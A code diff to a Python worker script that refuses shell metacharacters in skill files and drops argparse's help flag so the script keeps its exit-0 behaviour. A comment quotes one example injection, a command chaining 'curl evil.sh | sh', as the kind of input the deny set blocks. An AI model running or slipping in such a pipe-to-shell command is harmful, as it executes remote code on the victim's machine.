@@ -28,6 +28,9 @@ VERIFY_TIMEOUT_S = 120
 DEFAULT_MODEL = "sonnet"
 # Refused rather than escaped: a skill file is attacker-controlled text, and
 # `stripe trigger x; curl evil.sh | sh` must never be something this runs.
+# Unused here by design -- Task 6's executable() is the consumer, tokenizing
+# a skill's verification.command with shlex and rejecting these characters
+# before ever building a subprocess argv.
 SHELL_METACHARACTERS = set(";&|<>`$(){}[]*?!\n\\\"'")
 
 
@@ -133,7 +136,14 @@ def executable(text, entry):
 def main(argv=None):
     if os.environ.get("SKILLFORGE_DRAFTING"):
         return 0
-    ap = argparse.ArgumentParser(description=__doc__)
+    # add_help=False: this worker only ever receives programmatically built
+    # argv (from reconcile.py / a hook), never a human typing -h, and the
+    # auto-added help action writes its usage text to STDOUT before raising
+    # SystemExit(0) -- the one argparse exit path that is not stderr-only.
+    # Dropping -h entirely means every remaining parse error still goes
+    # through parser.error(), which is stderr-only, so the except below is
+    # a pure exit-code fix with no stdout exposure left to reason about.
+    ap = argparse.ArgumentParser(description=__doc__, add_help=False)
     ap.add_argument("mode", choices=("critique", "executable"))
     ap.add_argument("--skill", required=True)
     ap.add_argument("--plugin-root",
@@ -141,10 +151,10 @@ def main(argv=None):
     try:
         args = ap.parse_args(argv)
     except SystemExit:
-        # argparse's own error/--help path calls sys.exit() directly, which
-        # would blow straight past every `return 0` below. It already writes
-        # its message to stderr, never stdout, so converting to a plain
-        # return here costs nothing and keeps the "always exits 0" contract.
+        # argparse's error path calls sys.exit() directly, which would blow
+        # straight past every `return 0` below. It writes only to stderr, so
+        # converting to a plain return here costs nothing and keeps the
+        # "always exits 0" contract.
         return 0
     try:
         entry = skill_entry(args.skill)
